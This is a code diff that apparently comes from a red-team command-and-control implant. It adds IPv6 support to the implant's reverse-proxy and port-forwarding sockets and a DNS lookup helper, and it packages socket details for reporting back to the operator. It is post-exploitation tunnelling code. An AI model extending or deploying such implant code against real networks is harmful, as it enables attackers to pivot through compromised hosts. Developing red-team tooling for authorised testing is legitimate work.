@@ -27,15 +27,22 @@ DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
 }
 
 /* Inspired from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/net/socket/tcp_server.c#L277 */
-PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
+PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
 {
-    PSOCKET_DATA Socket   = NULL;
-    SOCKADDR_IN  SockAddr = { 0 };
-    WSADATA      WsData   = { 0 };
-    BOOL         IoBlock  = TRUE;
-    DWORD        Result   = 0;
+    PSOCKET_DATA    Socket    = NULL;
+    SOCKADDR_IN     SockAddr  = { 0 };
+    SOCKADDR_IN6_LH SockAddr6 = { 0 };
+    WSADATA         WsData    = { 0 };
+    BOOL            IoBlock   = TRUE;
+    DWORD           Result    = 0;
 
-    PRINTF( "SocketNew => WinSock:[%x] Type:[%d] LclAddr:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", WinSock, Type, LclAddr, LclPort, FwdAddr, FwdPort )
+    if ( ! IPv4 && ! IPv6 )
+    {
+        PUTS( "No valid IP was provided" )
+        return NULL;
+    }
+
+    PRINTF( "SocketNew => WinSock:[%x] Type:[%d] IPv4:[%lx] IPv6:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", WinSock, Type, IPv4, IPv6, LclPort, FwdAddr, FwdPort )
 
     /* if we specified SOCKET_TYPE_NONE then that means that
      * the caller only wants an object inserted into the socket linked list. */
@@ -54,33 +61,71 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort
         }
 
         PUTS( "Create Socket..." )
-        WinSock = Instance.Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL );
-        if ( WinSock == INVALID_SOCKET )
+
+        if ( IPv4 )
         {
-            PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
-            goto CLEANUP;
+            WinSock = Instance.Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL );
+            if ( WinSock == INVALID_SOCKET )
+            {
+                PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
+
+            /* Set bind address and port */
+            SockAddr.sin_addr.s_addr = IPv4;
+            SockAddr.sin_port        = HTONS16( LclPort );
+            SockAddr.sin_family      = AF_INET;
+
+            PRINTF( "SockAddr: %d.%d.%d.%d:%d\n",
+                    ( IPv4 & 0x000000ff ) >> ( 0 * 8 ),
+                    ( IPv4 & 0x0000ff00 ) >> ( 1 * 8 ),
+                    ( IPv4 & 0x00ff0000 ) >> ( 2 * 8 ),
+                    ( IPv4 & 0xff000000 ) >> ( 3 * 8 ),
+                    LclPort
+            )
         }
+        else
+        {
+            WinSock = Instance.Win32.WSASocketA( AF_INET6, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
+            if ( WinSock == INVALID_SOCKET )
+            {
+                PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
+                goto CLEANUP;
+            }
 
-        /* Set bind address and port */
-        SockAddr.sin_addr.s_addr = LclAddr;
-        SockAddr.sin_port        = HTONS16( LclPort );
-        SockAddr.sin_family      = AF_INET;
+            /* Set bind address and port */
+            MemCopy( &SockAddr6.sin6_addr, IPv6, 16 );
+            SockAddr6.sin6_port   = HTONS16( LclPort );
+            SockAddr6.sin6_family = AF_INET6;
 
-        PRINTF( "SockAddr: %d.%d.%d.%d:%d\n",
-                ( LclAddr & 0x000000ff ) >> ( 0 * 8 ),
-                ( LclAddr & 0x0000ff00 ) >> ( 1 * 8 ),
-                ( LclAddr & 0x00ff0000 ) >> ( 2 * 8 ),
-                ( LclAddr & 0xff000000 ) >> ( 3 * 8 ),
+            PRINTF( "SockAddr6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%d\n",
+                IPv6[0],  IPv6[1],  IPv6[2],  IPv6[3],
+                IPv6[4],  IPv6[5],  IPv6[6],  IPv6[7],
+                IPv6[8],  IPv6[9],  IPv6[10], IPv6[11],
+                IPv6[12], IPv6[13], IPv6[14], IPv6[15],
                 LclPort
-        )
+            )
+        }
 
         if ( Type == SOCKET_TYPE_REVERSE_PROXY )
         {
-            /* connect to host:port */
-            if ( Instance.Win32.connect( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
+            if ( IPv4 )
             {
-                PRINTF( "connect failed: %d\n", NtGetLastError() )
-                goto CLEANUP;
+                /* connect to host:port */
+                if ( Instance.Win32.connect( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
+                {
+                    PRINTF( "connect failed: %d\n", NtGetLastError() )
+                    goto CLEANUP;
+                }
+            }
+            else
+            {
+                /* connect to host:port */
+                if ( Instance.Win32.connect( WinSock, &SockAddr6, sizeof( SOCKADDR_IN6_LH ) ) == SOCKET_ERROR )
+                {
+                    PRINTF( "connect failed: %d\n", NtGetLastError() )
+                    goto CLEANUP;
+                }
             }
 
             /* set socket to non blocking */
@@ -94,6 +139,8 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort
         }
         else
         {
+            // SOCKET_TYPE_REVERSE_PORTFWD only supports IPv4
+
             /* set socket to non blocking */
             if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
             {
@@ -123,7 +170,8 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort
     Socket          = NtHeapAlloc( sizeof( SOCKET_DATA ) );
     Socket->ID      = RandomNumber32();
     Socket->Type    = Type;
-    Socket->LclAddr = LclAddr;
+    Socket->IPv4    = IPv4;
+    Socket->IPv6    = IPv6;
     Socket->LclPort = LclPort;
     Socket->FwdAddr = FwdAddr;
     Socket->FwdPort = FwdPort;
@@ -139,6 +187,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort
 CLEANUP:
     if ( WinSock && WinSock != INVALID_SOCKET )
         Instance.Win32.closesocket( WinSock );
+    Instance.Win32.WSACleanup();
 
     return NULL;
 }
@@ -173,7 +222,7 @@ VOID SocketClients()
                 {
                     /* Add the client to the socket linked list so we can read from it later on
                      * TODO: maybe ad a parent to know from what socket it came from so we can free those clients after we killed/removed the parent */
-                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, Socket->LclAddr, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );
+                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );
 
                     /* create socket response package */
                     Package = PackageCreate( DEMON_COMMAND_SOCKET );
@@ -183,7 +232,7 @@ VOID SocketClients()
                     PackageAddInt32( Package, Client->ID );
 
                     /* Local Host & Port data */
-                    PackageAddInt32( Package, Client->LclAddr );
+                    PackageAddInt32( Package, Client->IPv4 );
                     PackageAddInt32( Package, Client->LclPort );
 
                     /* Forward Host & Port data */
@@ -296,7 +345,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
         PackageAddInt32( Package, Socket->ID );
 
         /* Local Host & Port data */
-        PackageAddInt32( Package, Socket->LclAddr );
+        PackageAddInt32( Package, Socket->IPv4 );
         PackageAddInt32( Package, Socket->LclPort );
 
         /* Forward Host & Port data */
@@ -383,16 +432,20 @@ VOID SocketPush()
 }
 
 /*!
- * Query the IP from the specified domain
+ * Query the IPv4 from the specified domain
  * @param Domain
- * @return Ip address
+ * @return IPv4 address
  */
-DWORD DnsQueryIP( LPSTR Domain )
+DWORD DnsQueryIPv4( LPSTR Domain )
 {
     ADDRINFOA   hints     = { 0 };
     PADDRINFOA  res       = NULL;
     DWORD       IP        = 0;
     INT         Ret       = 0;
+
+    hints.ai_family   = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
 
     Ret = Instance.Win32.getaddrinfo( Domain, NULL, &hints, &res );
     if ( Ret != 0 )
@@ -401,9 +454,11 @@ DWORD DnsQueryIP( LPSTR Domain )
         return 0;
     }
 
-    IP = ((struct sockaddr_in *)(res->ai_addr))->sin_addr.S_un.S_addr;
+    IP = ((struct sockaddr_in *)res->ai_addr)->sin_addr.S_un.S_addr;
 
-    PRINTF( "Got IP for %s: %d.%d.%d.%d\n",
+    Instance.Win32.freeaddrinfo( res );
+
+    PRINTF( "Got IPv4 for %s: %d.%d.%d.%d\n",
         Domain,
         ( IP & 0x000000ff ) >> ( 0 * 8 ),
         ( IP & 0x0000ff00 ) >> ( 1 * 8 ),
@@ -412,4 +467,50 @@ DWORD DnsQueryIP( LPSTR Domain )
     )
 
     return IP;
+}
+
+/*!
+ * Query the IPv6 from the specified domain
+ * @param Domain
+ * @return IPv6 address
+ */
+PBYTE DnsQueryIPv6( LPSTR Domain )
+{
+    ADDRINFOA   hints     = { 0 };
+    PADDRINFOA  res       = NULL;
+    DWORD       IP        = 0;
+    INT         Ret       = 0;
+    PBYTE       IPv6      = NULL;
+
+    hints.ai_family   = AF_INET6;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    Ret = Instance.Win32.getaddrinfo( Domain, NULL, &hints, &res );
+    if ( Ret != 0 )
+    {
+        PRINTF( "getaddrinfo failed with %d for %s\n", Ret, Domain );
+        return NULL;
+    }
+
+    // the caller is responsible fot freeing this!
+    IPv6 = Instance.Win32.LocalAlloc( LPTR, 16 );
+
+    MemCopy( IPv6, ((struct sockaddr_in6 *)res->ai_addr)->sin6_addr.u.Byte, 16 );
+
+    Instance.Win32.freeaddrinfo( res );
+
+    PRINTF( "Got IPv6 for %s: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\n",
+        Domain,
+        IPv6[0], IPv6[1],
+        IPv6[2], IPv6[3],
+        IPv6[4], IPv6[5],
+        IPv6[6], IPv6[7],
+        IPv6[8], IPv6[9],
+        IPv6[10], IPv6[11],
+        IPv6[12], IPv6[13],
+        IPv6[14], IPv6[15]
+    )
+
+    return IPv6;
 }
